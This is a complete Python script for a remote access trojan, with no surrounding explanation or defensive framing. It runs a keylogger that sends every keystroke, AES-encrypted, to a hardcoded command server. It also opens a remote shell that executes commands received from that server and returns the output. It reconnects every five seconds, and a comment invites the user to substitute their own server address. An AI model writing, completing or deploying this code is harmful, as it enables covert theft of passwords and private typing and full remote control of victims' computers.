import socket
import threading
import os
import subprocess
from pynput import keyboard
from Crypto.Cipher import AES
import base64
import hashlib
import time

class RAT:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.key = hashlib.sha256(b'G7s!k$2Pz9t%VcR@hL#q8').digest()
        self.conn = None

    def encrypt_data(self, data):
        cipher = AES.new(self.key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        return base64.b64encode(cipher.nonce + tag + ciphertext)

    def decrypt_data(self, data):
        raw_data = base64.b64decode(data)
        nonce, tag, ciphertext = raw_data[:16], raw_data[16:32], raw_data[32:]
        cipher = AES.new(self.key, AES.MODE_EAX, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag)

    def keylogger(self):
        def on_press(key):
            try:
                log = f'{key.char}'
            except AttributeError:
                log = f'{key}'

            self.send_data(log.encode('utf-8'))

        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    def connect_to_server(self):
        while True:
            try:
                self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.conn.connect((self.server_ip, self.server_port))
                break
            except Exception as e:
                print(f"Connection failed: {e}. Retrying in 5 seconds...")
                self.conn.close()
                time.sleep(5)

    def send_data(self, data):
        try:
            encrypted_data = self.encrypt_data(data)
            self.conn.sendall(encrypted_data)
        except Exception as e:
            print(f"Failed to send data: {e}")
            self.connect_to_server()

    def receive_data(self):
        try:
            data = self.conn.recv(1024)
            return self.decrypt_data(data)
        except Exception as e:
            print(f"Failed to receive data: {e}")
            self.connect_to_server()
            return None

    def remote_shell(self):
        while True:
            command = self.receive_data()
            if command is None or command.decode('utf-8').lower() == 'exit':
                break
            try:
                output = subprocess.getoutput(command.decode('utf-8'))
                self.send_data(output.encode('utf-8'))
            except Exception as e:
                self.send_data(f"Error: {str(e)}".encode('utf-8'))

    def run(self):
        self.connect_to_server()

        # Start keylogger in a separate thread
        threading.Thread(target=self.keylogger, daemon=True).start()

        # Run remote shell
        self.remote_shell()

if __name__ == "__main__":
    rat = RAT('192.168.0.3', 9999)  # Replace with your server's IP address
    rat.run()
